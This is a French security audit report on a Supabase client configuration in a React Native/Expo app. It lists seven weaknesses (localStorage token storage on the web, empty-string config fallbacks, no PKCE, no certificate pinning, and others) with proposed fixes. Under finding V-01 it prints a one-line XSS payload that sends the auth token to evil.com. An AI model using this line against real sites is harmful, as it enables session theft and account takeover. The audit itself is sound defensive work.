# Audit de Sécurité — Configuration du Client Supabase

**Fichier audité :** `frontend/application/lib/supabase.ts`
**Date :** 6 mai 2026
**Auditeur :** Pentest Expert (analyse statique)
**Portée :** Configuration du client Supabase, gestion des sessions, stockage des tokens

---

## Résumé Exécutif

Le fichier `supabase.ts` initialise un client Supabase unique partagé par toute l'application React Native / Expo. L'audit révèle **7 vulnérabilités ou faiblesses**, dont **2 de sévérité haute**, **3 moyennes** et **2 basses**. La plus critique est l'utilisation de `localStorage` sur la plateforme web, qui expose directement les tokens d'authentification à toute attaque XSS.

| Sévérité | Nombre |
|----------|--------|
| 🔴 Haute | 2 |
| 🟠 Moyenne | 3 |
| 🟡 Basse | 2 |

---

## Détail des Vulnérabilités

---

### V-01 — Stockage des tokens via `localStorage` sur le web

| | |
|---|---|
| **Sévérité** | 🔴 **HAUTE** |
| **CVSS estimé** | 7.5 |
| **CWE** | CWE-922 (Insecure Storage of Sensitive Information) |
| **Ligne** | 17 |

**Constat :**

```typescript
storage: Platform.OS === 'web' ? window.localStorage : ExpoSecureStoreAdapter,
```

Sur la plateforme web, les tokens JWT (access token, refresh token) sont stockés dans `window.localStorage`. Ce stockage est accessible à **tout code JavaScript exécuté dans le même contexte d'origine** (same-origin), y compris :

- Du code injecté via une faille XSS (stored, reflected, DOM-based)
- Des bibliothèques tierces malveillantes ou compromises (supply chain attack)
- Des extensions de navigateur avec permissions sur la page

**Impact :**
Un attaquant exploitant une faille XSS peut exfiltrer les tokens en une seule ligne :
```javascript
new Image().src = "https://evil.com/steal?t=" + localStorage.getItem("sb-<project>-auth-token");
```
Cela permet une **usurpation complète de la session utilisateur** (account takeover), avec accès à toutes les données et actions autorisées par le rôle de l'utilisateur sur Supabase.

**Recommandation :**

1. **Privilégier les cookies `httpOnly`, `Secure`, `SameSite=Strict`** via le package `@supabase/ssr` ou un proxy backend (BFF — Backend For Frontend) qui gère les tokens côté serveur.
2. Si `localStorage` est inévitable, implémenter une **Content Security Policy (CSP) stricte** pour réduire la surface d'attaque XSS.
3. Activer le chiffrement côté client des tokens avant stockage (defense in depth).

**Correction proposée (option SSR/cookie) :**

```typescript
import { createBrowserClient } from '@supabase/ssr';

// Sur le web, utiliser le client SSR qui stocke les tokens dans des cookies httpOnly
export const supabase = Platform.OS === 'web'
  ? createBrowserClient(supabaseUrl, supabaseAnonKey, {
      cookies: {
        get(name: string) { /* lecture cookie */ },
        set(name: string, value: string, options: CookieOptions) { /* écriture cookie */ },
        remove(name: string, options: CookieOptions) { /* suppression cookie */ },
      },
    })
  : createClient(supabaseUrl, supabaseAnonKey, {
      auth: {
        storage: ExpoSecureStoreAdapter,
        autoRefreshToken: true,
        persistSession: true,
        detectSessionInUrl: false,
      },
    });
```

---

### V-02 — Fallback silencieux avec chaîne vide pour l'URL et la clé anonyme

| | |
|---|---|
| **Sévérité** | 🔴 **HAUTE** |
| **CWE** | CWE-1188 (Initialization with Hard-Coded Network Resource Configuration) |
| **Ligne** | 12–13 |

**Constat :**

```typescript
const supabaseUrl = process.env.EXPO_PUBLIC_SUPABASE_URL || "";
const supabaseAnonKey = process.env.EXPO_PUBLIC_SUPABASE_ANON_KEY || "";
```

Si les variables d'environnement ne sont pas définies (erreur de déploiement, fichier `.env` manquant, build CI mal configuré), le client Supabase est instancié avec une URL vide et une clé vide. Conséquences :

- **Pas d'erreur explicite au démarrage** : l'application démarre et les requêtes échouent silencieusement ou produisent des erreurs réseau incompréhensibles.
- **Risque de fuite d'information** : en cas d'erreur d'URL, les requêtes pourraient être envoyées à un domaine par défaut ou provoquer des comportements inattendus.
- **Debugging difficile** : en production, diagnostiquer un problème de configuration silencieux est coûteux en temps.

**Recommandation :**
Échouer bruyamment et immédiatement (*fail fast*) si la configuration est absente.

**Correction proposée :**

```typescript
const supabaseUrl = process.env.EXPO_PUBLIC_SUPABASE_URL;
const supabaseAnonKey = process.env.EXPO_PUBLIC_SUPABASE_ANON_KEY;

if (!supabaseUrl || !supabaseAnonKey) {
  throw new Error(
    '[Supabase] EXPO_PUBLIC_SUPABASE_URL et EXPO_PUBLIC_SUPABASE_ANON_KEY doivent être définis. ' +
    'Vérifiez votre fichier .env et votre configuration de build.'
  );
}
```

---

### V-03 — `detectSessionInUrl: false` incompatible avec OAuth web

| | |
|---|---|
| **Sévérité** | 🟠 **MOYENNE** |
| **CWE** | CWE-287 (Improper Authentication) |
| **Ligne** | 20 |

**Constat :**

```typescript
detectSessionInUrl: false,
```

Ce paramètre désactive la détection automatique des fragments d'URL contenant les tokens de session après un callback OAuth (ex. : `#access_token=...&refresh_token=...`). C'est **correct et nécessaire** pour les plateformes mobiles natives (deep links gérés différemment). Cependant, si l'application est aussi utilisée sur le **web** :

- Les flux OAuth (Google, Apple, etc.) ne fonctionneront pas : après redirection, le token dans l'URL ne sera jamais lu.
- L'utilisateur restera non authentifié malgré un flow OAuth réussi côté fournisseur.

**Impact :**
Impossible d'utiliser l'authentification OAuth sur la plateforme web. Sur mobile, pas d'impact négatif.

**Recommandation :**
Conditionner ce paramètre à la plateforme, comme c'est déjà fait pour `storage` :

```typescript
detectSessionInUrl: Platform.OS === 'web',
```

---

### V-04 — Absence de `flowType: 'pkce'`

| | |
|---|---|
| **Sévérité** | 🟠 **MOYENNE** |
| **CWE** | CWE-346 (Origin Validation Error) |
| **Ligne** | 15–22 |

**Constat :**
Aucun `flowType` n'est spécifié dans la configuration `auth`. Par défaut, Supabase utilise le flux **implicit** qui transmet les tokens directement dans le fragment d'URL. Ce flux est considéré comme **obsolète** par l'IETF (RFC 9700, anciennement OAuth 2.0 Security Best Current Practice) pour les applications mobiles et les SPA.

**Impact :**
- Les tokens sont exposés dans l'historique du navigateur et les logs serveur (Referer header).
- Pas de protection contre l'interception du callback (authorization code interception attack).

**Recommandation :**
Utiliser le flux **PKCE** (Proof Key for Code Exchange), recommandé pour les applications mobiles et les SPA :

```typescript
auth: {
    flowType: 'pkce',
    // ... reste de la configuration
},
```

---

### V-05 — Absence de certificate pinning

| | |
|---|---|
| **Sévérité** | 🟠 **MOYENNE** |
| **CWE** | CWE-295 (Improper Certificate Validation) |
| **Ligne** | N/A (absence) |

**Constat :**
Le client Supabase ne configure aucun mécanisme de **certificate pinning** (épinglage de certificat). Sur une application mobile manipulant des données sensibles (tokens d'authentification, données personnelles), l'absence de pinning permet :

- Des attaques **Man-in-the-Middle (MitM)** via un certificat racine malveillant installé sur l'appareil (ex. : MDM d'entreprise, malware avec accès root).
- L'interception du trafic via des proxys comme mitmproxy, Charles Proxy ou Burp Suite avec un certificat CA custom.

**Impact :**
Un attaquant en position MitM peut intercepter et modifier toutes les communications entre l'application et Supabase, y compris les tokens JWT.

**Recommandation :**
Implémenter le certificate pinning via une bibliothèque adaptée (ex. : `react-native-ssl-pinning` ou TrustKit) ou via la configuration réseau native :

- **Android** : `network_security_config.xml` avec `<pin-set>`
- **iOS** : `NSAppTransportSecurity` avec `NSPinnedDomains` dans `Info.plist`

Le client Supabase supporte un `fetch` custom via les options globales :

```typescript
export const supabase = createClient(supabaseUrl, supabaseAnonKey, {
    global: {
        fetch: customFetchWithPinning,
    },
    auth: { /* ... */ },
});
```

---

### V-06 — Absence de headers de sécurité personnalisés

| | |
|---|---|
| **Sévérité** | 🟡 **BASSE** |
| **CWE** | CWE-778 (Insufficient Logging) |
| **Ligne** | N/A (absence) |

**Constat :**
Aucun header personnalisé n'est ajouté aux requêtes Supabase. Des headers supplémentaires pourraient renforcer la traçabilité et la sécurité :

- `X-Client-Version` : identification de la version de l'application pour le monitoring.
- `X-Request-ID` : corrélation des requêtes pour l'audit et le debugging.
- Headers d'identification de la plateforme pour les RLS (Row Level Security) policies côté Supabase.

**Recommandation :**

```typescript
export const supabase = createClient(supabaseUrl, supabaseAnonKey, {
    global: {
        headers: {
            'X-Client-Version': APP_VERSION,
            'X-Client-Platform': Platform.OS,
        },
    },
    auth: { /* ... */ },
});
```

---

### V-07 — Instance globale unique sans mécanisme d'invalidation

| | |
|---|---|
| **Sévérité** | 🟡 **BASSE** |
| **CWE** | CWE-613 (Insufficient Session Expiration) |
| **Ligne** | 15 |

**Constat :**

```typescript
export const supabase = createClient(supabaseUrl, supabaseAnonKey, { /* ... */ });
```

L'instance Supabase est créée une seule fois au chargement du module et exportée en tant que singleton. Il n'existe aucun mécanisme pour :

- **Réinitialiser le client** après une déconnexion (le cache interne, les listeners et les subscriptions realtime persistent).
- **Forcer l'invalidation** des sessions en cas de compromission détectée.
- **Isoler les contextes** si l'application supporte plusieurs comptes.

**Impact :**
Après un `signOut()`, des données résiduelles pourraient persister dans l'état interne du client. Dans un scénario multi-utilisateurs sur le même appareil, un second utilisateur pourrait brièvement recevoir des événements realtime du premier.

**Recommandation :**
Encapsuler la création du client dans une factory avec possibilité de recréation :

```typescript
let _supabase: ReturnType<typeof createClient> | null = null;

export function getSupabase() {
  if (!_supabase) {
    _supabase = createClient(supabaseUrl, supabaseAnonKey, { /* config */ });
  }
  return _supabase;
}

export async function resetSupabaseClient() {
  if (_supabase) {
    await _supabase.auth.signOut();
    _supabase.removeAllChannels();
    _supabase = null;
  }
}
```

---

## Matrice de Risques

| ID | Vulnérabilité | Sévérité | Exploitabilité | Impact | Priorité |
|----|---------------|----------|----------------|--------|----------|
| V-01 | localStorage sur web (XSS) | 🔴 Haute | Élevée (XSS fréquent) | Account takeover | **P0** |
| V-02 | Fallback chaîne vide | 🔴 Haute | Certaine (mauvaise config) | Déni de service silencieux | **P0** |
| V-03 | detectSessionInUrl désactivé sur web | 🟠 Moyenne | Certaine (OAuth web cassé) | Auth OAuth non fonctionnel | **P1** |
| V-04 | Pas de flux PKCE | 🟠 Moyenne | Moyenne | Interception de token | **P1** |
| V-05 | Pas de certificate pinning | 🟠 Moyenne | Moyenne (MitM requis) | Interception du trafic | **P1** |
| V-06 | Pas de headers custom | 🟡 Basse | N/A | Traçabilité réduite | **P2** |
| V-07 | Singleton sans invalidation | 🟡 Basse | Faible | Fuite de session résiduelle | **P2** |

---

## Points Positifs

- **SecureStore sur mobile natif** : L'utilisation de `expo-secure-store` pour les plateformes iOS et Android est **conforme aux bonnes pratiques**. Les tokens sont stockés dans le Keychain (iOS) ou le Keystore (Android), chiffrés par le système.
- **autoRefreshToken activé** : Le rafraîchissement automatique des tokens évite les expirations de session inattendues et réduit le risque d'utilisation de tokens expirés.
- **persistSession activé** : La persistance de session améliore l'UX sans compromettre la sécurité (grâce à SecureStore sur mobile).
- **Polyfill URL** : L'import de `react-native-url-polyfill/auto` assure la compatibilité avec l'API URL dans React Native.

---

## Plan de Remédiation Recommandé

| Phase | Actions | Effort | Délai conseillé |
|-------|---------|--------|-----------------|
| **Phase 1** (immédiat) | Corriger V-02 (fail fast) | Faible | 1 jour |
| **Phase 1** (immédiat) | Ajouter `flowType: 'pkce'` (V-04) | Faible | 1 jour |
| **Phase 2** (court terme) | Migrer le stockage web vers cookies httpOnly (V-01) | Moyen | 1 semaine |
| **Phase 2** (court terme) | Conditionner `detectSessionInUrl` (V-03) | Faible | 1 jour |
| **Phase 3** (moyen terme) | Implémenter le certificate pinning (V-05) | Élevé | 2 semaines |
| **Phase 3** (moyen terme) | Refactorer en factory pattern (V-07) | Moyen | 3 jours |
| **Phase 4** (amélioration) | Ajouter les headers de traçabilité (V-06) | Faible | 1 jour |

---

*Fin du rapport d'audit — `lib/supabase.ts`*
